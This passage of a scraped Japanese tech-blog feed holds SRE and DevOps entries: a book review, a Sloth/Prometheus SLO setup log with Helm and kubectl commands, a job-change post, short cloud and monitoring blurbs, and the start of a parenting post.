継続的デプロイと継続的デリバリ5.5　機能フラグ5.6　パイプラインの実行5.7　テストインフラの管理5.8　DevSecOps5.9　本章のまとめ6章　アラート疲れ6.1　苦労話6.2　オンコールローテーションの目的6.3　オンコールローテーションの設定6.4　アラート基準6.5　オンコールローテーションの配置6.6　オンコールへの補償6.7　オンコールの幸福度を追跡する6.8　オンコール担当中のタスク6.9　本章のまとめ7章　空の道具箱7.1　社内ツールと自動化が重要な理由7.2　なぜ組織はもっと自動化しないのか7.3　自動化に関する文化の問題を解決する7.4　自動化を優先する7.5　自動化の目標を決める7.6　スキルセットのギャップを埋める7.7　自動化のアプローチ7.8　本章のまとめ8章　業務時間外のデプロイ8.1　苦労話8.2　デプロイのレイヤ8.3　デプロイを日常的に行う8.4　頻繁に行うことで恐怖心を減らす8.5　リスクを減らして恐怖心を減らす8.6　デプロイプロセスの各レイヤでの失敗への対応8.7　デプロイアーティファクトの作成8.8　デプロイパイプラインの自動化8.9　本章のまとめ9章　せっかくのインシデントを無駄にする9.1　良いポストモーテムの構成要素9.2　インシデントの発生9.3　ポストモーテムの実施9.4　本章のまとめ10章　情報のため込み：ブレントだけが知っている10.1　どのように情報がため込まれているかを理解する10.2　意図せずに情報をため込んでいる人を認識する10.3　コミュニケーションを効果的に構築する10.4　知識を発見可能にする10.5　チャットツールの有効活用10.6　本章のまとめ11章　命じられた文化11.1　文化とは何か？11.2　文化はどのように行動に影響を与えるか？11.3　文化を変えるには？11.4　文化に合った人材11.5　本章のまとめ12章　多すぎる尺度12.1　目標の階層    12.1.1　組織の目標    12.1.2　部門の目標    12.1.3　チームの目標    12.1.4　目標の確認12.2　どの仕事に取り掛かるかに意識的になる    12.2.1　優先度、緊急度、重要度    12.2.2　アイゼンハワーの意思決定マトリックス    12.2.3　コミットメントにノーと言う方法12.3　チームの仕事を整理する    12.3.1　作業を細分化する    12.3.2　イテレーションの作成12.4　予定外の作業    12.4.1　予定外の作業のコントロール    12.4.2　予定外の作業への対応12.5　本章のまとめ本書のまとめ訳者あとがき索引特徴と感想ハードスキルというよりソフトスキルを得るための書籍である本書のタイトルや目次を見ると、本書はDevOpsの概念やアンチパターンの紹介の書籍かと思われるが CAMS(文化、自動化、メトリクス、共有)についてのソフトスキル(ツールや道具ではなく)を組織や個人で実践するためのHowTo本だという印象を受けました。運用(に関わるソフトウェア)エンジニア版の7つの習慣(語弊あり)。それぞれの章は奥が深く、章で取り上げているものはソフトスキルに絞って知識をバランス良く記載していると感じました。DevOpsとSREの違い今からSREのキャリアを目指す方には混乱させてしまうかもしれないのでざっくり、DevOpsとSREの違いについて少し解説していきます。「class SRE implements DevOps」という考えが良い回答かなと思います。「class SRE implements DevOps」は、「SREはDevOpsというinterfaceの実装である」という意味を表します。「DevOps = 思想」という定義に対し、それを具体化し実装したものがSREであるという考えです。DevOpsにも以下の5点のような考え方がありSREにも似たような考え方がありますよね？組織のサイロの削減（風通しのよい組織の実現）エラー発生を前提とする（100%を目指さない）段階的に変更を行う（一気にすべてを変更しない）ツールと自動化を活用する（サービス成長と正比例で運用工数を増やさない）全てを計測する（モニタリングに基づく数値設定が重要）ただ、上記はあくまで思想、概念でしかなく、具体的な方法論ではありません。これを具体的にどのように行うかを「トイルの削減・自動化」「SLI/SLOの設定による目標定量化」といった形で、誰でも用いられるように体系化させたものがSREといえます。本書はDevOpsのソフトスキル面を主に扱ってるそのため、ソフトウェアの運用に関わる人であればどのレベルの人が読んでも良いと思います。また、本書はSREを目指す方が読んでも学びになる書籍だと思います。まとめ「システム運用アンチパターン」はシステム運用に関わったことがある人があの時、本書を読んでいればなにかが変わったかもしれないと思えるほど学びのある。なぜ、それがイケてないか優しく説明してくれる素晴らしい熟練の先輩との対話のような一冊でした。特に本書の『DevOps文化は必ずしもA地点からB地点へ進むようなものではないことを覚えておいてください。』という言葉はカンファレンスや技術ブログ記事で紹介されているツールやワークフローにすぐに飛びつきたくなる私のような無知で軽率な若者にはとても響きました。それよりもソフトスキルを組織に根付かせることの重要性を様々な視点から本書は教えてくれました。みなさんも『システム運用アンチパターン』をぜひ手に取ってみてください。おまけGoでの開発やSRE/DevOps について雑談 をしたい方を募集してますー！雑談する予定しかしないのですが仕事の話でもキャリアの話でも学生の方でも社会人の方でも気軽にお待ちしております。meety.net参考O\'Reilly Japan - システム運用アンチパターンGoogle - Site Reliability Engineering","link":"https://syu-m-5151.hatenablog.com/entry/2022/05/27/070239","isoDate":"2022-05-26T22:02:39.000Z","dateMiliSeconds":1653602559000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"istio-proxy 停止時の挙動","contentSnippet":"istio の sidecar である pilot-agent, envoy が Pod の終了時にどう振る舞うのかをまとめてみました。 デフォルトの istio-proxy Pod Delete されたタイミングで各コ […]The post istio-proxy 停止時の挙動 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/istio-proxy-stop-behavior/","isoDate":"2022-05-26T00:17:32.000Z","dateMiliSeconds":1653524252000,"authorName":"Sreake","authorId":"Sreake"},{"title":"PrometheusのSLO generator であるSloth について雑多な作業ログ入門失敗編","contentSnippet":"はじめにこのブログではPrometheus のSLO generator であるSloth に関して取り上げたいと思っている。正直、業務後の深夜に書いているのでGrafana でDashboards を生成したら感動的なラストシーンということにしてほしい。今回は取り上げないが最近、バージョン1.0.0 になったOpenSLOの 周辺知識も気になっている。OpenSLOについて | フューチャー技術ブログ などはOpenSLOに関して2022 年5月現在で日本語で書かれている文章だと最高に良いと思います。 ナマケモノのイラスト | かわいいフリー素材集 いらすとや より引用SLIを計測しSLOを設定するいきなり、Slothの話をするのも流石に不親切なのでSRE的な話を少しだけします。ITサービスの運用に置いて、信頼性100%と、信頼性99.99%では大きな違いがあります。信頼性100%を実現するためには、99.99%とは異なり膨大な工数を投入する必要があるが、ほとんどのユーザーにとっては「99.999%」が「100%」になったからといって、大きなメリットがないことのほうが多いのである。つまり、100%を目指すことは効率的ではない場面が多いため、各サービスごとに適切な可用性を設定する必要だ。はじめに、SLIですが、これは「Service Level indicator」の略で、提供されているサービスのレベルの性質を定義した計測量である。一般的には以下をSLIとして用いる。リクエストのレイテンシ（リクエストに対するレスポンスを返すまでにかかった時間）エラー率（受信したリクエストを正常に処理できなかった比率）システムスループット（単位時間あたりに処理できるリクエスト数）可用性（サービスが利用できる時間の比率）次に、SLOですが、これは「Service Level Objective」の略で、SLIで計測されるサービスレベルの目標値、または目標値の範囲を指します。例えば、SLOを「年99.99%」と設定すると、「1年のうち52分は稼働しなくてもよい」ということになる。例えば、「1年の間にサービスが30分停止する障害」が生じたとしても、SLOの範囲であればそれは想定の範囲であり、問題ではなくなる。同様の用語で、SLA というのがある。これは「Service Level Agreement」の略で、こちらはITサービスの契約において「この稼働率を下回る場合、金銭的な保証を行う」ことを示す値です。SLIは測定値、SLOは補償を伴わない目標値である点で意味合いが異なる。Sloth の特徴で、Sloth はPrometheusベースのSLOを作成するために、複雑な仕様やプロセスを把握して使用する必要がないように。迅速、簡単、かつ信頼性の高いPrometheus SLO generator(生成)してくれる。生成された記録とアラートのルールに基づき、信頼性の高い均一なSLOの実装を実現します。Kubernetes でCRDなどを用いてサポートしており、OpenSLOも限定的にサポートしています。Sloth が生成するPrometheusのルールは3つのカテゴリーに分類されます。1つ目がSLIです。SlothにおけるSLOはルールはベースとなるもので、ユーザーから提供されたクエリを使用して、エラーサービスレベル（可用性）が何であるかを示すために使用される値を取得するものです。異なる時間帯に対して複数のルールを作成し、これらの異なる結果がアラートに使用されます。2つ目がMetadataです。これらは、残りのエラーバジェットやSLO目標パーセントのような有益なメトリックとして使用されます。これらは、Grafanaダッシュボードなど、SLOの可視化に非常に便利です。3つ目がAlerts でSLIルールに基づくマルチウィンドウ・マルチバーンアラートです。Sloth はサービスレベル仕様書を受け取り、仕様書の各SLOについて、上記のカテゴリーで3つのルールグループを作成します。MetricsSlothが生成したルールは、SLO間で同じメトリック名を共有します。しかし、ラベルは異なるサービス、SLOを識別するためのキーとなる。このようにして、異なるチームやサービス間で、すべてのSLOを記述する統一された方法を得ることが出来ます。Slothが作成し、利用可能なすべてのメトリック名を取得するには、次のクエリを使用します。count({sloth_id!=\\"\\"}) by (__name__)AlertSlothの SLOアラートは、マルチウィンドウ・マルチバーン方式を採用し、Critical/page とWarning/ticketの2種類のアラートを生成します。また、時間帯によって4種類のAlertを使用します(が割愛)。また、Sloth は自らAlertを発するのではなく、Slothが生成したAlertルールを使ってPrometheusがAlertを発する。Prometheusに接続されたalertmanagerを介してSlack、Pagerdutyなど に通知をトリガーします。sloth.devやっていくGetting started - Sloth を参考にKubernetes上に構築をやっていくPromethus 周りのインストール# Get Helm Repository Infohelm repo add prometheus-community https://prometheus-community.github.io/helm-chartshelm repo update# Install Helm Chart :https://github.com/prometheus-community/helm-charts/tree/main/charts/kube-prometheus-stack#configurationhelm install [RELEASE_NAME] prometheus-community/kube-prometheus-stackSloth のインストールSloth のhelm はこちらにあるので参照してください。github.comhelm repo add sloth https://slok.github.io/slothhelm repo updatehelm install [RELEASE_NAME] sloth/sloth もしくはCRDをデプロイしていきましょう# Sloth CRD is required$ kubectl apply -f ./pkg/kubernetes/gen/crd/sloth.slok.dev_prometheusservicelevels.yaml# Prometheus Operator Rules CRD is required$ kubectl apply -f ./test/integration/crd/prometheus-operator-crd.yamlhelpコマンドをインストールしたらhelp を見る良い習慣です。sloth helpusage: sloth [<flags>] <command> [<args> ...]Easy SLO generator.Flags:  --help            Show context-sensitive help (also try --help-long and --help-man).  --debug           Enable debug mode.  --no-log          Disable logger.  --no-color        Disable logger color.  --logger=default  Selects the logger type.Commands:  help [<command>...]    Show help.  generate [<flags>]    Generates Prometheus SLOs.  kubernetes-controller [<flags>]    Runs Sloth in Kubernetes controller/operator mode.  validate --input=INPUT [<flags>]    Validates the SLO manifests and generation of Prometheus SLOs.  version    Shows version.generatedget-started.ymlと同じ例ですが、Kubernetes で実行するのでCRDを使用した例です。Kubernetesのprometheus-operator PrometheusRules CRDにPrometheusのルールを生成します。sloth.devk8s-getting-started.yml をsloth generate させます。ちなみにnamespace を namespace: default にして実行いたします。$ sloth generate -i k8s-getting-started.yml INFO[0000] SLI plugins loaded                            plugins=0 svc=storage.FileSLIPlugin version=1912e6a window=30d                                                            INFO[0000] SLO period windows loaded                     svc=alert.WindowsRepo version=1912e6a window=30d windows=2                                                                INFO[0000] Generating from Kubernetes Prometheus spec    version=1912e6a window=30d                                                                                                INFO[0000] Multiwindow-multiburn alerts generated        out=- slo=myservice-requests-availability svc=generate.prometheus.Service version=1912e6a window=30d                      INFO[0000] SLI recording rules generated                 out=- rules=8 slo=myservice-requests-availability svc=generate.prometheus.Service version=1912e6a window=30d              INFO[0000] Metadata recording rules generated            out=- rules=7 slo=myservice-requests-availability svc=generate.prometheus.Service version=1912e6a window=30d              INFO[0000] SLO alert rules generated                     out=- rules=2 slo=myservice-requests-availability svc=generate.prometheus.Service version=1912e6a window=30d~~~k8s-getting-started.yml を元にさまざまなファイルが生成されています！眠いので解説はしません# This example shows the same example as getting-started.yml but using Sloth Kubernetes CRD.# It will generate the Prometheus rules in a Kubernetes prometheus-operator PrometheusRules CRD.## `sloth generate -i ./examples/k8s-getting-started.yml`#apiVersion: sloth.slok.dev/v1kind: PrometheusServiceLevelmetadata:  name: sloth-slo-my-service  namespace: monitoringspec:  service: \\"myservice\\"  labels:    owner: \\"myteam\\"    repo: \\"myorg/myservice\\"    tier: \\"2\\"  slos:    - name: \\"requests-availability\\"      objective: 99.9      description: \\"Common SLO based on availability for HTTP request responses.\\"      sli:        events:          errorQuery: sum(rate(http_request_duration_seconds_count{job=\\"myservice\\",code=~\\"(5..|429)\\"}[{{.window}}]))          totalQuery: sum(rate(http_request_duration_seconds_count{job=\\"myservice\\"}[{{.window}}]))      alerting:        name: MyServiceHighErrorRate        labels:          category: \\"availability\\"        annotations:          summary: \\"High error rate on \'myservice\' requests responses\\"        pageAlert:          labels:            severity: pageteam            routing_key: myteam        ticketAlert:          labels:            severity: \\"slack\\"            slack_channel: \\"#alerts-myteam\\"validate構文チェックも可能です$ sloth validate --input=k8s-getting-started.ymlINFO[0000] SLI plugins loaded                            plugins=0 svc=storage.FileSLIPlugin version=1912e6a window=30dINFO[0000] SLO period windows loaded                     svc=alert.WindowsRepo version=1912e6a window=30d windows=2INFO[0000] Validation succeeded                          slo-specs=1 version=1912e6a window=30ddeploygenerate したものをapply していきます$ sloth generate -i k8s-getting-started.yml | kubectl apply -f -Grafana へのログインkube-prometheus のGrafanaは初期ID/PASS のadmin:admin ではないのでパスワードを確認する(ArgoCD でも似たように初期パスワードを取得できる)# user:password -> admin:prom-operator$ kubectl get secret sloth-grafana -o jsonpath=\\"{.data.admin-password}\\" | base64 --decode ; echoprom-operatorGrafana へのDashBoard の追加SLO / Detail dashboard for Grafana | Grafana Labs入門失敗Dashboards を生成したら感動的なラストシーン！？このダッシュボードには、各SLOの詳細が表示されますがこれには、http_request_duration_seconds_count にデータが入ってないわ。。。          errorQuery: sum(rate(http_request_duration_seconds_count{job=\\"myservice\\",code=~\\"(5..|429)\\"}[{{.window}}]))          totalQuery: sum(rate(http_request_duration_seconds_count{job=\\"myservice\\"}[{{.window}}]))Dashboards - Sloth にしたいんですけど,,, もう眠いので一旦、終わって公開します。Sloth はとりあえず動かすためのチュートリアルが絶妙に弱くてPrometheusをある程度理解してないとうまく動かせないなーって思いました(小物として)。参考Sloth - SlothSLO / Detail dashboard for Grafana | Grafana LabsPrometheus - Monitoring system & time series database","link":"https://syu-m-5151.hatenablog.com/entry/2022/05/25/165633","isoDate":"2022-05-25T07:56:33.000Z","dateMiliSeconds":1653465393000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"リモートワークのナレッジ","contentSnippet":"ここ最近リモートワークですが、辛くないですか？とか、〜なときどうしているんですか？みたいなことを複数件聞かれたりしています。自宅で仕事をするようになって2年と半年ぐらいになった男の意識していることや環境のことを共有してみ […]The post リモートワークのナレッジ first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/remote-work-knowledge/","isoDate":"2022-05-25T00:15:51.000Z","dateMiliSeconds":1653437751000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Goで立てたWebサーバーでソケットを学ぶ","contentSnippet":"目的TCPなどにまるで明るくないので、学習のために調べてみました 環境Arch Linux(5.17.9-arch1-1)go version go1.18.3 linux/amd64 やることGoで書いたWebサーバーを動かして挙動を確認したり、少しコードを見てみますコードは以下ですpackage mainimport (\\t\\"fmt\\"\\t\\"log\\"\\t\\"net/http\\"\\t\\"time\\")func main() {\\thttp.HandleFunc(\\"/\\", func(w http.ResponseWriter, r *http.Request)...","link":"https://zenn.dev/tayusa/articles/077d911b357a92","isoDate":"2022-05-22T12:32:11.000Z","dateMiliSeconds":1653222731000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"【ZDnet寄稿記事掲載】ようこそSREの世界へ","contentSnippet":"テクノロジーで新たなビジネスを創造するすべてのリーダーを対象に、価値創造や課題解決のヒントを発信するメディア「ZDnet Japan」に、Srekae事業部部長手塚が「SRE」をテーマに寄稿記事を連載しております。 多く […]The post 【ZDnet寄稿記事掲載】ようこそSREの世界へ first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/sre_zdnet_what_is_sre/","isoDate":"2022-05-19T07:34:00.000Z","dateMiliSeconds":1652945640000,"authorName":"Sreake","authorId":"Sreake"},{"title":"AWSでマルチリージョン対応に利用したサービス","contentSnippet":"2021年３月、AWSで大阪がフルリージョンになり国内でマルチリージョン対応が可能なりました。https://aws.amazon.com/jp/local/osaka-region/ Active-Standbyの構成 […]The post AWSでマルチリージョン対応に利用したサービス first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/aws-multi-region-services/","isoDate":"2022-05-19T00:11:34.000Z","dateMiliSeconds":1652919094000,"authorName":"Sreake","authorId":"Sreake"},{"title":"SREの中核を担うモニタリングの必要性とその戦略について理解する","contentSnippet":"SRE導入において「モニタリング」は欠かせない要素のひとつです。モニタリングは、システムを可視化するために行うものであり、常にシステムの健康状態を把握し、問題が何か起こったときにサービスの健全性を判定・診断するうえで中核 […]The post SREの中核を担うモニタリングの必要性とその戦略について理解する first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/sre-monitoring-strategy/","isoDate":"2022-05-18T02:01:21.000Z","dateMiliSeconds":1652839281000,"authorName":"Sreake","authorId":"Sreake"},{"title":"良いポストモーテムを執筆するために必要な5つのポイント","contentSnippet":"SREにおいてポストモーテムの文化を根付かせることは必要不可欠です。ポストモーテムはSREの導入効果をより高め、結果としてシステムの信頼性向上に繋がる体制が作れます。 本記事では、良いポストモーテムの形成方法について解説 […]The post 良いポストモーテムを執筆するために必要な5つのポイント first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/5point-good-postmortem/","isoDate":"2022-05-18T01:59:15.000Z","dateMiliSeconds":1652839155000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Google Cloud上で簡易的な高権限管理を実現する","contentSnippet":"高権限管理とは 高権限、特権ID、リリース権限、etc… 平常時は運用に必要な最低限の権限のみを持ち、リリース作業や障害対応などの必要なタイミングでのみ権限を一時的に付与する 安全な運用の面ではもちろん、上場 […]The post Google Cloud上で簡易的な高権限管理を実現する first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/gcp-privilege-management/","isoDate":"2022-05-16T01:04:42.000Z","dateMiliSeconds":1652663082000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Azure AKSを試す","contentSnippet":"やったことAKSをazure-cliで構築する。Golangのアプリをデプロイする。AKS構築ログイン$ az loginサブスクリプションを確認し、SubscriptionIdをセット…","link":"https://qiita.com/ys1/items/c76cc01dcaf2ed0a6f14","isoDate":"2022-05-13T22:40:47.000Z","dateMiliSeconds":1652481647000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"Datadog APMを用いてLambdaのパフォーマンスを可視化する","contentSnippet":"AWSのプロジェクトではお馴染みのLambda関数を、 Datadog APMを用いてトレース情報の取得の手順についてご紹介しますThe post Datadog APMを用いてLambdaのパフォーマンスを可視化する first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/datadog-lambda/","isoDate":"2022-05-12T10:48:40.000Z","dateMiliSeconds":1652352520000,"authorName":"Sreake","authorId":"Sreake"},{"title":"GKE Autopilot 触ってみました","contentSnippet":"社内プロダクトではこんな感じで GKE Autopilot を使ってます 注意する箇所 Terraform google provider のバージョンを一定以上に上げる必要がある 公式の GCP Terraform M […]The post GKE Autopilot 触ってみました first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/gke-autopilot/","isoDate":"2022-05-12T02:00:00.000Z","dateMiliSeconds":1652320800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"cert-manager について学ぶ","contentSnippet":"ACME challenges [HTTP01] 概念が掴みにくい用語 チャレンジ (challenges)ACME クライアント(cert-manager)がドメインを所有しているのを確認すること Issuer (発行 […]The post cert-manager について学ぶ first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/learn-about-cert-manager/","isoDate":"2022-05-10T01:03:04.000Z","dateMiliSeconds":1652144584000,"authorName":"Sreake","authorId":"Sreake"},{"title":"GCR に push するときの権限周りの注意点","contentSnippet":"説明すること GCR での権限エラーの概要 GCS のバケットレベルについて GCR でのイメージの保存方法について GCR での権限エラーの概要 起きたこと あるアプリチームは GCR にイメージを push できるの […]The post GCR に push するときの権限周りの注意点 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/gcr-push/","isoDate":"2022-05-10T01:02:05.000Z","dateMiliSeconds":1652144525000,"authorName":"Sreake","authorId":"Sreake"},{"title":"ごめん、同窓会にはいけません。今、株式会社スリーシェイクにてソフトウェアエンジニアとして働いております。","contentSnippet":"はじめにこのブログは入社エントリーになります。帰属意識が低い訳でもないのに、どの同窓会に誘われてない私の26歳が終わってしまった。2022年の5月10日には27歳になったりもします。The 27 Clubじゃんと思ったけど何も残してない。26歳は新卒で入社した会社からSREの会社に転職をしました。ちなみに、去年の誕生日には最終出社をキメました。孤独独身男性なもんで26歳の誕生日を1人で焼肉やってる！！！ pic.twitter.com/zuDgnUsibY— nwiizo (@nwiizo) 2021年5月10日  転職後たくさん手を動かせているので個人的には転職に満足しております。また、技術的な事以外でいうと、オンラインでの登壇やアウトプットが増える施策をいくつか社内外で実施できた。これらを達成する為に人を巻き込んで人に頼ることができてるようになったことに自身の成長を感じております。ちなみに新卒で入った会社でしたが送別会などは(コロナを理由に)ありませんでした。やっていき去年の2021年6月1日から株式会社スリーシェイクにてソフトウェアエンジニアとして働いております。2021年06月01日に入社して12ヶ月目に突入いたしましたnwiizoです。\\"インフラをシンプルにしてイノベーションが起こりやすい世界を作る\\" でお馴染みの株式会社スリーシェイクにてソフトウェアエンジニアとして開発をさせていただいております。一日でも早く入社エントリーを書こうと思っていたら、11ヶ月も経過しておりました。以前より入社エントリーを入社前や直後に書いて理想ばかり語ってるのを見て青く眩しいなって思っていたのでちょうどいいかもしれません。今は怠惰な自分の性格を正当化しました。この記事では入社した理由と株式会社スリーシェイクの魅力について語っていきたいと思います。このブログは絶対的に入社エントリーになります。なぜ、前職を辞めたのか？2017年の新卒で入社したGMOインターネット株式会社を4年2ヶ月で退職いたしました。前職ではホスティングサービスの開発と運用、お名前.comやいくつかの商材サイトが載っている社内コンテナ基盤の開発と運用、エバンジェリストとしての業務を行なっていました。また、新卒エンジニアの技術力向上・適性判断を目的とした研修プログラムでコンテナ技術の講師を任せていただけたりと色々幅広くやってました。退職までのざっくりとした経緯や理由については元々、前職に入社したのは『俺が考える最強のソフトウェア基盤をサービスとして世の中に提供したいよー、いろんなパブリッククラウドに負けたくないよ〜』という感情からでした。入社後、わりと大きな大義を持って働いていたのでたくさんのチャンスをいただきました。が、様々な面での実力不足で実際のサービスの提供に至れませんでした。が、GMOインターネットという会社は「手を上げる文化」を大切にしており、特に新卒エンジニアにはチャンスをくれるいい会社だと思うのでこれを見てる学生の皆さんはオススメです。ので、リンクを貼っておきます。退職時のエントリーsyu-m-5151.hatenablog.com転職についてそんなこんなで、2017年から新卒で入社していろいろやらせてもらってました。が、これからも引き続きサービスの開発を行うために尽力する為に、会社に残る選択肢はありましたが、このまま、残ってもやりたいことをやりきるだけの力(コーディング力云々は除く)を身につけることはできねーなというようなある種の閉塞感みたいなものに心が囚われるようになり(完全なる言い訳)、このまま続けてもだらだらになってしまう気がして良くない。時間は有限だぞ!!！ と、転職することを決意しました。また、第二の理由に家庭の事情があります。前職では「地方でフルリモートワークの業務」というのは原則認められてませんでした。転職のタイミングで、実家の事情で「地方でフルリモートワークの業務」という希望を伝えた上でお声掛けいただいた会社さんと話をさせてもらい、最終的にスリーシェイクに参加することにしました。で元々は「地方でフルリモートワークの業務」を考えていたのですが、家族の助けもあり諸々が解決したおかげで東京に残る事が出来ました。自分自身がオフラインのカンファレンスに刺激をもらって向上心をキープしている部分があり、東京でのイベントに出かけやすい東京に残れて、本当によかったです。スリーシェイクのポイント手段の為なら目的を選ばないタイプのソフトウェア技術者としてSREやKubernetesを中心としたCloud Nativeな技術領域に関わっていきたいと漠然と考えていた。その中でスリーシェイクは技術領域はもちろん、会社としてのビジョンや掲げていることが気に入り、この会社で働いてみたいというのが面談、面接を通して更に強くなっていったからです。あとは、ひとつの会社に所属するだけでいろんな組織やチームのSREとして働けるなんてお得じゃんと思ってしまいました()。何よりも「インフラをシンプルにしてイノベーションが起こりやすい世界を作る」や「社会に蔓延る労苦〈Toil〉をなくすプラットフォーマーになる」をどれだけ躓いても全力でやりきっていける組織だと自分が思ったからです。NARUTOが以前「オレが知りてーのは楽な道のりじゃねェ 険しい道の歩き方だ」ということを言ってましたが吉田 拓真 / スリーシェイク (@taqqma_ikachan) / Twitter は本当にこんな感じのことを毎月の全社会でよく言ってます。スリーシェイクでやっていくことインフラエンジニアっぽいSRE として入社しました。現在はSRE支援事業とバックエンドエンジニアとしてSREのような信頼性の観点からのプラクティスや運用技術を実施出来るためのプロダクトの開発をしております。毎週、SRE Weekly を熟読して、こういうプロダクトを作りたいと常々思うようになっていたので本当に夢のようなお話です。また、アウトプットしないのは知的な便秘ということで引き続きアウトプットもやっていきます。Meetyもやっているのでみんなお話ししましょう。こちらはTwitterでDMをいただければ幸いです。meety.netSREやインフラエンジニアだけではなく様々な職種の募集をしているので皆様！！！！3-shake.com最後に下記のリンクに皆さんへの日々の感謝を正拳突きで表現させていただいております。入社エントリーでもあるのですが明日は誕生日です。いつもありがとうございます！www.amazon.co.jp","link":"https://syu-m-5151.hatenablog.com/entry/2022/05/09/171305","isoDate":"2022-05-09T08:13:05.000Z","dateMiliSeconds":1652083985000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"AWSリソースの自動起動停止について","contentSnippet":"考えたこと拡張性自動起動停止したいサーバーは増えていくだろうし、状況に応じて設定を一時解除したりもしたい。そのため、起動停止の設定を簡単に追加削除できるのが望ましい。さまざまなリソースの起動停…","link":"https://qiita.com/ys1/items/b5ea8bff2729aa7b2bcf","isoDate":"2022-05-08T11:57:00.000Z","dateMiliSeconds":1652011020000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"TerraformでECS FargateのBlue/Greenデプロイを構築する","contentSnippet":"概要TerraformでECS Fargateの環境を構築Codeシリーズを利用してBlue/Greenデプロイをできるようにする。Blue/Green時に必要な部分だけ記載Fargate …","link":"https://qiita.com/ys1/items/c6ee6a0d8474a7dfdd49","isoDate":"2022-05-05T04:30:15.000Z","dateMiliSeconds":1651725015000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"【バグバウンティQ＆A】Intigritiはバグバウンティプログラムをどのように最適化しているか？","contentSnippet":"【Q&A】シリーズでは、バグバウンティプログラムに関するよくある質問について、弊社CEOのStijn Jansがお答えしています。今回は、「Intigritiはバグバウンティプログラムをどのように最適化しているか」についてご紹介します。The post 【バグバウンティQ＆A】Intigritiはバグバウンティプログラムをどのように最適化しているか？ first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/how-does-intigriti-optimise-bug-bounty-success/","isoDate":"2022-04-28T01:55:08.000Z","dateMiliSeconds":1651110908000,"authorName":"Sreake","authorId":"Sreake"},{"title":"FargateにDatadog Agent導入してみた","contentSnippet":"Sreake事業部の槌田です。普段はSREとして設計、構築、監視まで業務をこなしています。最近、監視業務でDatadogを使うことが多くなってきて興味を持ち始めたので検証や知見を書いていく予定です！先日案件でECS on FargateにDatadog Agentを入れたのでインストール方法や知見を書いていきます。The post FargateにDatadog Agent導入してみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/datadog-agent/","isoDate":"2022-04-26T05:50:23.000Z","dateMiliSeconds":1650952223000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Datadog 101概要で紹介されているサービスのまとめ","contentSnippet":"Datadog 101 - 概要の動画で紹介されている機能について、著者なりの解釈で、キャプチャ画像とともにかいつまんでご紹介していきたいと思います。The post Datadog 101概要で紹介されているサービスのまとめ first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/datadog101/","isoDate":"2022-04-26T05:50:18.000Z","dateMiliSeconds":1650952218000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Google Cloud PCA について","contentSnippet":"試験概要 どんな試験？ Professional Cloud Architect 認定資格 | Google Cloud Professional Cloud Architect は、Google Cloud の技術を組 […]The post Google Cloud PCA について first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/google-cloud-pca-%e3%81%ab%e3%81%a4%e3%81%84%e3%81%a6/","isoDate":"2022-04-20T00:02:02.000Z","dateMiliSeconds":1650412922000,"authorName":"Sreake","authorId":"Sreake"},{"title":"9ヶ月の娘のヘルメット治療をはじめた","contentSnippet":"Kyashではじめての育休を取得した話で書いたとおり、第一子である娘が生まれて10ヶ月が経過した。ずり這い、ハイハイ、つかまり立ち、つたい歩きと順調に成長しているが、親としては少し頭が絶壁なのが気になっていた。ヘルメット治療とはヘルメット治療とは赤ちゃんの頭にヘルメットのような矯正器具をかぶせて、頭蓋骨の成長とともに形状を矯正していく治療のことをいう。治療期間は変形の具合やヘルメット治療の種類によってもまちまちではあるが、我が家から通える範囲で取り扱っているものは装着期間が最長6ヶ月で、かわいい盛りの娘にかぶせるのは少し抵抗があった。また、これから6ヶ月となると暑い時期にさしかかるため皮膚トラブルになるのはかわいそうだという気持ちがあった。治療すると決めるまではじめに頭の形が気になりはじめたのは妻で、娘が２ヶ月くらいの頃から頭の形には気をつけてくれていた。ドーナツ枕などでなんとかしようと頑張ってくれて、娘も基本的に抱っこで過ごしていたからか結果的に頭のゆがみ(斜頭)などはなかった。それでもバウンサーやベビーシートなどのせいか後頭部が平坦になっていた。ドーナツ枕ではもう改善が見られないため、ヘルメット治療が適用される月齢がすでにギリギリであることも踏まえて相談を持ちかけてきてくれた。はじめはヘルメット治療を扱っている脳外科にて、絶壁になっている理由が病気ではないことを確認してもらった。幸いなことに近くの病院で診察を受けるこができたし、病気ではないことも確認がとれた。ここで医師からヘルメット治療が必要だという処方箋をもらい、補装具製作所に行くことにした。これまた幸いなことに補装具製作所が車で1時間ほどのところにあり、詳細な頭の形の計測とヘルメット治療についての説明を受けることができた。計測の結果、絶壁レベル2と診断された。レベル2だと治療しない人もいるぐらいで、なおかつ月齢が低いうちにはじめた例に比べると月齢が大きいことから完全には治りにくいとのこと。はじめるのであれば9ヶ月のうちにはじめた方がいいと言われた。早めに決断しなくてはいけないことと変形レベルが0~5の中の2だったためやった方がいいのか妻と2人で話し合った。また妻から、娘が将来的に「頭の形が